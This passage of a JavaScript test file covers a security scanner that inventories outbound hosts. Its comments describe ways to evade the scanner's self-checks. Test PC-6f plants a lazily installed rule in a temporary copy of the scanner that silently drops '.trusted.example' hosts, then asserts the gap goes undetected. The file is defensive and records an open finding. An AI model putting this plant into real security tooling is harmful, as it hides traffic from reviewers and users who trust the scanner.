  //   a7  the rule installs on `Math` instead of `globalThis`, so a check that
  //       diffs globalThis's own keys sees nothing. Any intrinsic works.
  //   a8  the rule installs LAZILY, on first call, from inside a function body.
  //       NOTHING changes at module scope.
  //
  // a8 is the one that matters. Every mechanism the inventory derives —
  // bindings, entries, members, detectors, unclassified statements, global
  // effects — is about MODULE SCOPE. A rule inside a function body is outside
  // that frame however many shapes the frame learns, so widening the shape list
  // a seventh time would not have touched it.
  //
  // WHY THE DRIFT CHECK DOES NOT CLOSE IT EITHER. `behaviourFingerprint`
  // catches both when a PRISTINE BASELINE exists — PC-6d relies on exactly that,
  // and it is why a7/a8-shaped plants are noticed there. But when the rule is
  // already committed INTO the module, the repository's own file IS the
  // baseline; there is nothing to diff against. Drift is a review-time and
  // CI-against-main mechanism, not a self-check.
  //
  // WHAT WOULD ACTUALLY CLOSE IT: statement-level mutation coverage of the
  // security module — every statement, inside functions included, either killed
  // by a named test or declared equivalent with proof. That is the only frame
  // that does not care where a rule lives. It is a build of its own and it is
  // not being attempted unreviewed at the end of a round.
  //
  // This test asserts the CURRENT state so the hole is on the record and closing
  // it breaks here deliberately.
  test('PC-6f a rule inside a function body produces no mechanism — OPEN', async () => {
    const base = readFileSync(fileURLToPath(SCAN_URL), 'utf8');
    const dir = mkdtempSync(join(tmpdir(), 'pc6f-'));
    try {
      // The a8 shape: nothing at module scope, the rule installs on first call.
      const planted = base.replace(
        '      literals.push({ host, file: mod.path, line: s.line, via: s.kind });',
        "      if (!globalThis.__gwLazy) globalThis.__gwLazy = (h) => h.endsWith('.trusted.example');\n" +
        '      if (globalThis.__gwLazy(host)) continue;\n' +
        '      literals.push({ host, file: mod.path, line: s.line, via: s.kind });');
      assert.notEqual(planted, base, 'fixture: the plant must actually apply');
      const file = join(dir, 'provider-scan.mjs');
      writeFileSync(file, planted, 'utf8');
      const href = SURFACE_URL_HREF(file);

      // It genuinely changes what the scanner answers…
      const M = await import(href);
      assert.deepEqual(
        M.scanModule({ path: 't.mjs', source: "export const f = () => fetch('https://x.trusted.example/v1');" })
          .literals.map((l) => l.host), [],
        'fixture: the planted rule must really delete a host literal');

      // …and the module-scope inventory sees NOTHING.
      const g = deriveGlobalEffects(href, INVENTORY_MODULES.scan);
      const derived = [
        ...deriveMechanisms(planted, INVENTORY_MODULES.scan),
        ...deriveRuntimeMechanisms(M, INVENTORY_MODULES.scan),
        ...g,
      ];
      const { unobserved } = reconcile(derived, PROVIDER_MUTANTS);
      assert.deepEqual(unobserved.map((m) => m.id), [],
        'OPEN FINDING S1-H2: if this now FAILS, the inventory has learned to see below ' +
        'module scope and this test should be deleted — the finding is closed.');
      assert.deepEqual(g.map((m) => m.id), [],
        'the lazy install happens on first CALL, and the probe only imports');
    } finally { rmSync(dir, { recursive: true, force: true }); }
  });
});
